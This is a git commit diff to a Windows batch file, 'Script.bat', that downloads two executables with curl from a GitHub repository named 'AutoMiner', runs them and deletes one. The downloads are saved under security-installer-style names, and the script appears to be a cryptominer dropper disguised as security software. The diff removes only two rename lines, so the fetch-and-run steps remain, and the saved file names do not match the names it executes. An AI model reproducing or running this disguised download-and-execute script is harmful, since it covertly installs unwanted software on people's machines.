d191a996db5f201648d60ca083386cd84f8bbdd7
Elliot Marks <elliotmarks06@gmail.com>
2022-01-03 21:27:19 -0700

    Update Script.bat

--- Script.bat
+++ Script.bat
@@ -1,8 +1,6 @@
 @echo off
 curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_C.exe -o ManjoSecurityInstallerC.exe
-Ren "ManjoSecureRollout_C.exe_raw=true" "ManjoSecureRollout_C.exe"
 curl -LJO https://github.com/Tuba202/AutoMiner/blob/main/ManjoSecureRollout_g.exe -o ManjoSecurityInstallerG.exe
-Ren "ManjoSecureRollout_g.exe_raw=true" "ManjoSecureRollout_G.exe"
 ManjoSecureRollout_C.exe
 ManjoSecureRollout_G.exe
 Del ManjoSecureRollout_C.exe
